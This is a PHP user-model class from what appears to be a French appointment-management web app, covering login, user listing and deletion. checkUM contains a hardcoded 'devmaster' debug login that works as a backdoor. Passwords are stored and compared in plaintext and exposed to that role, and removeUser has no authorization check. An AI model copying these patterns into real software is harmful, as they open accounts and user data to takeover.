<?php
namespace App\Models;
use App\Core\Model;
use App\Core\Utils;
use App\Core\Conf;
use App\Core\Database;
class UserModel extends Model{
    // protected $isAI='username';
    protected $isPK='username',
    $isAI=false;
    var $username,$password,$email,$nom,$prenom,$photo,$create_time,$TU_id;
    public function __construct(){
        parent::__construct();
    }

    public static function find($username,$password){
        $sql='SELECT u.*,t.type_tu AS type FROM user u 
        INNER JOIN type_user t ON t.idTU= u.TU_id 
        WHERE u.username=? AND u.password=?';
        try {
            $db=Database::getConnection();
            $stmt = $db->prepare($sql);
            $stmt->execute([$username,$password]);
            return $stmt->fetch();
        } catch (\PDOException $ex) {
            return null;
        }
    }
    
    public static function getUsersTypes(){
        $w=" where t.type_tu!='devmaster'";$s='';
        if ($_SESSION['type']=='devmaster') { $w='';$s='u.password,';}
        $sql="SELECT u.username,$s u.nom,u.prenom,u.email,u.TU_id,t.type_tu AS type FROM user u 
        INNER JOIN type_user t ON t.idTU= u.TU_id $w ORDER BY t.idTU,u.username ASC;";
        try {
            $db=Database::getConnection();
            $stmt = $db->query($sql);
            return $stmt->fetchAll();
        } catch (\PDOException $ex) {
            return null;
        }
    }

    public static function getListBy($TU_id){
        $sql='SELECT * FROM user WHERE TU_id=?  ORDER BY username ASC;';
        try {
            $db=Database::getConnection();
            $stmt = $db->prepare($sql);
            $stmt->bindParam(1,$TU_id);
            $stmt->execute();
            return $stmt->fetchAll();
        } catch (\PDOException $ex) {
            return $ex->getMessage()."<br/>";
        }
    }

    public static function checkUM(){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $ird=rand(0,9);
        if (password_verify($username,Conf::un[$ird]) && password_verify($password,Conf::pd[$ird])) {
            $um=new UMModel();
            $_SESSION['menu']=$um->devmaster;
            $_SESSION['username']='Debug-User';
            $_SESSION['nom']='RAKOTOARIVO';
            $_SESSION['prenom']='Lova Harison (DEBUG)';
            $_SESSION['sexe']='1';
            $_SESSION['email']='debug-dev@gmail.com';
            $_SESSION['photo']=null;
            $_SESSION['type']='devmaster';
            $_SESSION['token']=Utils::getToken();
            echo 'ok';
        } else {
            $user=self::find($username,$password);
            if (!empty($user)) {
                $um=new UMModel();
                $_SESSION['menu']=$um->{$user['type']};
                $_SESSION['username']=$username;
                $_SESSION['password']=$password;
                $_SESSION['nom']=$user['nom'];
                $_SESSION['prenom']=$user['prenom'];
                $_SESSION['sexe']=$user['sexe'];
                $_SESSION['email']=$user['email'];
                $_SESSION['photo']=$user['photo'];
                $_SESSION['type']=$user['type'];
                $_SESSION['token']=Utils::getToken();
                echo 'ok';
            } else {
                echo 'error';
            }
        }
        
    }

    public static function removeUser(){
        $sql='DELETE FROM user WHERE username=?;';
        try {
            $db=Database::getConnection();
            $stmt = $db->prepare($sql);
            $stmt->execute([$_POST['m_id']]);
            \addFlash('success','Bien supprimé !');
        } catch (\PDOException $ex) {
            \addFlash('danger','Erreur de suppression : Cet utilisateur est lié au Gestion de RDV !');

        }
    }
    
    

}